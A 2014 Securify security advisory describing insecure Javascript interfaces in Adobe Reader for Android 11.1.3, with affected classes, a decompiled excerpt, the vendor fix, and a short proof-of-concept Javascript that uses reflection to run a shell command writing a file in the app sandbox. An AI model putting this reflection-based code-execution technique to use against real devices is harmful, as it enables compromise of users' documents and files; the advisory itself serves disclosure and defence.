------------------------------------------------------------------------
Adobe Reader for Android exposes insecure Javascript interfaces
------------------------------------------------------------------------
Yorick Koster, April 2014

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
Adobe Reader for Android [2] exposes several insecure Javascript
interfaces. This issue can be exploited by opening a malicious PDF in
Adobe Reader. Exploiting this issue allows for the execution of
arbitrary Java code, which can result in a compromise of the documents
stored in Reader and files stored on SD card.

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully verified on Adobe Reader for Android
version 11.1.3.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
Adobe released version 11.2.0 of Adobe Reader that add
@JavascriptInterface [3] annotations to public methods that should be
exposed in the Javascript interfaces. In addition, the app now targets
API Level 17 and contains a static method
(shouldInitializeJavaScript()) that is used to check the device's
Android version.

http://www.securify.nl/advisory/SFY20140401/reader_11.2.0_release_notes.png
Figure 1: Adobe Reader for Android 11.2.0 release notes

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
Adobe Reader for Android allows users to work with PDF documents on an
Android tablet or phone. According to Google Play, the app is installed
on 100 million to 500 million devices.

The following classes expose one or more Javascript interfaces:

- ARJavaScript
- ARCloudPrintActivity
- ARCreatePDFWebView

The app targets API Level 10, which renders the exposed Javascript
interfaces vulnerable to code execution - provided that an attacker
manages to run malicious Javascript code within Adobe Reader.

------------------------------------------------------------------------
PDF Javascript APIs
------------------------------------------------------------------------
It appears that Adobe Reader for Mobile supports [4] a subset of the
Javascript for Acrobat APIs. For some reason the exposed Javscript
objects are prefixed with an underscore character.

public class ARJavaScript
{
[...]

     public ARJavaScript(ARViewerActivity paramARViewerActivity)
     {
[...]
         this.mWebView.addJavascriptInterface(new 
ARJavaScriptInterface(this),
"_adobereader");
         this.mWebView.addJavascriptInterface(new
ARJavaScriptApp(this.mContext), "_app");
         this.mWebView.addJavascriptInterface(new ARJavaScriptDoc(), 
"_doc");
         this.mWebView.addJavascriptInterface(new
ARJavaScriptEScriptString(this.mContext), "_escriptString");
         this.mWebView.addJavascriptInterface(new ARJavaScriptEvent(),
"_event");
         this.mWebView.addJavascriptInterface(new ARJavaScriptField(),
"_field");
         this.mWebView.setWebViewClient(new ARJavaScript.1(this));
this.mWebView.loadUrl("file:///android_asset/javascript/index.html");
     }

An attacker can create a specially crafted PDF file containing
Javascript that runs when the target user views (or interacts with)
this PDF file. Using any of the Javascript objects listed above
provides the attacker access to the public Reflection APIs inherited
from Object. These APIs can be abused to run arbitrary Java code.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
The following proof of concept [5] will create a text file in the app
sandbox.

function execute(bridge, cmd) {
     return bridge.getClass().forName('java.lang.Runtime')
         .getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}

if(window._app) {
     try {
         var path = '/data/data/com.adobe.reader/mobilereader.poc.txt';
         execute(window._app, ['/system/bin/sh','-c','echo \"Lorem 
ipsum\" > '
+ path]);
         window._app.alert(path + ' created', 3);
     } catch(e) {
         window._app.alert(e, 0);
     }
}
------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] 
http://www.securify.nl/advisory/SFY20140401/adobe_reader_for_android_exposes_insecure_javascript_interfaces.html
[2] https://play.google.com/store/apps/details?id=com.adobe.reader
[3] 
http://developer.android.com/reference/android/webkit/JavascriptInterface.html
[4] 
http://www.adobe.com/devnet-docs/acrobatetk/tools/Mobile/js.html#supported-javascript-apis
[5] http://www.securify.nl/advisory/SFY20140401/mobilereader.poc.pdf